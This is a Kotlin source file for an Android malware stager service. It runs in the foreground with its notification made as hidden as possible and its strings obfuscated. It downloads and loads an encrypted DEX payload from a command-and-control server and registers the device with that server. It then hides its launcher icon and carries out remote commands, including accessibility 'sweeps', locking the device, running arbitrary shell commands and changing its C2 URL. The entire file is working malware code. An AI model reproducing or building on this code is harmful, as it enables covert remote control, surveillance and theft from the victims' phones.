package com.chameleon.stager.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.chameleon.stager.R
import com.chameleon.stager.StagerApplication
import com.chameleon.stager.payload.PayloadLoader
import com.chameleon.stager.ui.MainActivity
import com.chameleon.stager.utils.CryptoUtils
import com.chameleon.stager.utils.NetworkUtils
import com.chameleon.stager.utils.ObfuscatedStrings
import org.json.JSONArray
import org.json.JSONObject

class PayloadService : Service() {
    companion object {
        const val TAG = "PayloadService"
        const val NOTIFICATION_ID = 1001
        const val RECONNECT_DELAY = 10000L
    }

    private val CHANNEL_ID: String by lazy { ObfuscatedStrings.notifChannelId }

    private var isRunning = false
    private var c2WebSocket: WebSocketClient? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.i(TAG, "Payload service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) return START_STICKY

        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)

        isRunning = true

        // Step 1: Download the payload DEX
        downloadAndLoadPayload()

        // Step 2: Connect to C2
        connectToC2()

        return START_STICKY
    }

    override fun onBind(p0: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        c2WebSocket?.disconnect()
        Log.i(TAG, "Payload service destroyed")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                ObfuscatedStrings.notifTitle,
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = ObfuscatedStrings.notifText
                setShowBadge(false)
                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(ObfuscatedStrings.notifTitle)
            .setContentText(ObfuscatedStrings.notifText)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun downloadAndLoadPayload() {
        Thread {
            try {
                val payloadUrl = "${StagerApplication.c2RealUrl}/api/payload"
                val dexBytes = NetworkUtils.downloadBytes(payloadUrl)
                if (dexBytes != null) {
                    val decrypted = CryptoUtils.decryptPayload(dexBytes)
                    PayloadLoader.loadDex(this, decrypted)
                    Log.i(TAG, "Payload loaded successfully")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to load payload", e)
            }
        }.start()
    }

    private fun connectToC2() {
        Thread {
            var retries = 0
            while (isRunning && retries < 10) {
                try {
                    c2WebSocket = WebSocketClient(StagerApplication.c2WsUrl)
                    c2WebSocket?.connect(
                        onMessage = { msg -> handleC2Message(msg) },
                        onConnected = {
                            retries = 0
                            registerDevice()
                        }
                    )
                    break
                } catch (e: Exception) {
                    retries++
                    Log.e(TAG, "C2 connection failed (attempt $retries)", e)
                    Thread.sleep(RECONNECT_DELAY * retries)
                }
            }
        }.start()
    }

    private fun registerDevice() {
        try {
            val registerMsg = JSONObject().apply {
                put("type", ObfuscatedStrings.msgRegister)
                val data = JSONObject().apply {
                    put("device_id", Build.ID)
                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                    put("manufacturer", Build.MANUFACTURER)
                    put("model", Build.MODEL)
                    put("android_version", Build.VERSION.RELEASE)
                    put("api_level", Build.VERSION.SDK_INT)
                    put("timestamp", System.currentTimeMillis())
                }
                put("data", data)
            }
            c2WebSocket?.send(registerMsg.toString())
            Log.i(TAG, "Device registered with C2")
            hideLauncherIcon()
        } catch (e: Exception) {
            Log.e(TAG, "Registration failed", e)
        }
    }

    private fun hideLauncherIcon() {
        try {
            val pm = packageManager
            val component = ComponentName(this, MainActivity::class.java)
            if (pm.getComponentEnabledSetting(component) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.i(TAG, "Launcher icon hidden")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide icon", e)
        }
    }

    private fun handleC2Message(message: String) {
        try {
            val json = JSONObject(message)
            when (json.optString("type")) {
                ObfuscatedStrings.msgCommand -> handleCommand(json)
                "ping" -> {
                    c2WebSocket?.send("""{"type":"pong"}""")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse C2 message", e)
        }
    }

    private fun handleCommand(json: JSONObject) {
        val command = json.optString("command")
        val commandId = json.optString("command_id")
        val params = json.optJSONObject("params")

        Log.i(TAG, "Received command: $command")

        when (command) {
            ObfuscatedStrings.cmdStartSweep -> {
                val duration = params?.optInt("duration", 300) ?: 300
                StagerAccessibilityService.instance?.startSweep(duration * 1000L)
                sendCommandAck(commandId, "received")
            }
            ObfuscatedStrings.cmdStopSweep -> {
                StagerAccessibilityService.instance?.stopSweep()
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdLockDevice -> {
                lockDevice()
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdReleaseDevice -> {
                releaseDevice()
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdExecCommand -> {
                val cmd = params?.optString("cmd", "") ?: ""
                executeShellCommand(cmd)
                sendCommandAck(commandId, "done")
            }
            ObfuscatedStrings.cmdUpdateConfig -> {
                val newC2Url = params?.optString("c2_url", "")
                if (newC2Url != null) {
                    StagerApplication.updateC2Url(newC2Url)
                }
                sendCommandAck(commandId, "done")
            }
        }
    }

    private fun sendCommandAck(commandId: String, status: String) {
        try {
            val ack = JSONObject().apply {
                put("type", ObfuscatedStrings.msgCommandAck)
                val data = JSONObject().apply {
                    put("command_id", commandId)
                    put("status", status)
                }
                put("data", data)
            }
            c2WebSocket?.send(ack.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send ack", e)
        }
    }

    private fun lockDevice() {
        StagerAccessibilityService.instance?.lockDevice()
        Log.i(TAG, "Device locked")
    }

    private fun releaseDevice() {
        StagerAccessibilityService.instance?.releaseDevice()
        Log.i(TAG, "Device released")
    }

    private fun executeShellCommand(cmd: String) {
        try {
            val process = Runtime.getRuntime().exec(cmd)
            process.waitFor()
        } catch (e: Exception) {
            Log.e(TAG, "Shell exec failed", e)
        }
    }
}
